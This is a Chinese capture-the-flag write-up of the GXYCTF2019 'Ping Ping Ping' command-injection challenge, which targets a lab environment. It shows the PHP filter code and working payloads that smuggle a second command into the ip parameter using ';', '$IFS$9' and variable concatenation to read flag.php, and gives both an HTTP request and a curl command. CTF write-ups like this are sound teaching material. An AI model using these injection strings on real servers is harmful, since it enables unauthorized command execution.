---
title: GXYCTF2019 - Web - Ping Ping Ping
date: 2026-11-14 18:14:00
categories:
  - CTF
  - GXYCTF2019
  - Web
tags:
  - 命令注入
  - 空格绕过
  - IFS变量
  - 关键字过滤绕过
cover: /img/cover/blindfold-side-portrait.jpg
description: GXYCTF2019 的多层过滤命令注入题。shell_exec 拼接 ip，过滤符号、空格、bash 与 flag 顺序。用 $IFS$9 绕过空格、x=ag;y=fl 打断顺序，再以 tac 逆向读 flag.php 拿 flag。
keywords:
  - 命令注入
  - IFS
  - 变量拼接
  - tac
  - GXYCTF2019
ai: >-
  本题来自 GXYCTF2019，是带多层过滤的命令注入题。后端把 ip 拼进 shell_exec 执行 ping，index.php 拦截符号、空格、bash 与 .*f.*l.*a.*g.* 顺序串。先用分号 ls 确认可注入并读源码，再以 $IFS$9 绕空格、x=ag;y=fl 拼出 flag 打断顺序检测，用 tac 逆向读取。载荷 ip=127.0.0.1;x=ag;y=fl;tac$IFS$9$y$x.php 读出 flag.php 中的 flag，平台 accepted 加 1 分，脱敏记为 flag{xxxx}。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | GXYCTF2019 |
| 方向 | Web |
| 难度 | Easy（分值 1） |
| 环境 | 授权靶场（已脱敏） |
| 漏洞类型 | 命令注入（RCE）+ 多层过滤绕过 |

## 信息收集

- `ip=127.0.0.1` 正常 ping。
- `ip=127.0.0.1;ls` 可列出 `flag.php`、`index.php`（分号可用，确认注入点）。

## 漏洞分析

后端 `shell_exec("ping -c 4 ".$ip)` 直接拼接用户输入 `ip` 参数执行命令。过滤规则（`index.php` 源码，通过 `cat$IFS$9index.php` 读到）：

```php
if(preg_match("/\&|\/|\?|\*|\||\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip)){
    die("fxck your symbol!");
} else if(preg_match("/ /", $ip)){
    die("fxck your space!");
} else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
} else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
}
$a = shell_exec("ping -c 4 ".$ip);
```

三层过滤：

| 过滤 | 拦截内容 |
|---|---|
| 符号 | `& / ? * \| ' " \ ( ) [ ] { }` |
| 空格 | ` ` |
| 关键字 | `bash` |
| 顺序匹配 | `.*f.*l.*a.*g.*`（按顺序出现 f、l、a、g） |

## 利用过程

1. **探测注入**：`ip=127.0.0.1;ls` 列出 `flag.php`、`index.php`（分号可用）。
2. **确认过滤**：`cat flag.php` 报 `fxck your space!`（空格过滤）；`${IFS}` 报 `fxck your symbol!`（`$`、`{` 被过滤）；`cat flag.php` 报 `fxck your flag!`（flag 顺序过滤）。
3. **读源码看规则**：`cat$IFS$9index.php` 成功读到完整过滤逻辑。
4. **绕过空格**：用 `$IFS$9`（不含被过滤的 `& / ? * \| ' " \ ( ) [ ] { }`，实测可绕过）。
5. **绕过 flag 顺序过滤**：变量拼接打断 `f→l→a→g` 顺序，`x=ag;y=fl`（让 `f` 出现在 `a`、`g` 之后），`$y$x` 即 `flag`。
6. **读 flag**：`head` / `more` 无输出，改用 `tac` 逆向输出成功：

```text
127.0.0.1;x=ag;y=fl;tac$IFS$9$y$x.php
```

响应输出 `flag.php` 内容，得到 flag（已脱敏）。

## 完整 EXP

关键 payload：

```http
GET /?ip=127.0.0.1;x=ag;y=fl;tac$IFS$9$y$x.php HTTP/1.1
Host: target:8080
```

curl 命令（URL 编码后）：

```bash
curl "http://target:8080/?ip=127.0.0.1%3Bx%3Dag%3By%3Dfl%3Btac%24IFS%249%24y%24x.php"
```

绕过思路小结：

```text
空格         → $IFS$9
flag 顺序    → 变量拼接 x=ag;y=fl（f 出现在 a、g 之后），$y$x = flag
读取命令     → tac（head/more 无输出时 tac 逆向读取成功）
```

## Flag

`flag{xxxx}`（已脱敏，来自 `flag.php` 的 `$flag` 变量）

平台提交记录：`accepted`，+1 分（提交编号已脱敏）。

## 踩坑与总结

1. 分号是最直接的命令分隔符，先确认它可用再考虑绕过。
2. `cat flag.php` 会同时踩中空格过滤与 flag 顺序过滤，需分开处理。
3. `${IFS}` 会触发符号过滤，`$IFS$9` 才是可用形态。
4. `.*f.*l.*a.*g.*` 只检测顺序，用变量把 `f` 挪到 `a`、`g` 之后即可打断。
5. 读取命令优先试 `tac`，`head` / `more` 在本环境无输出。
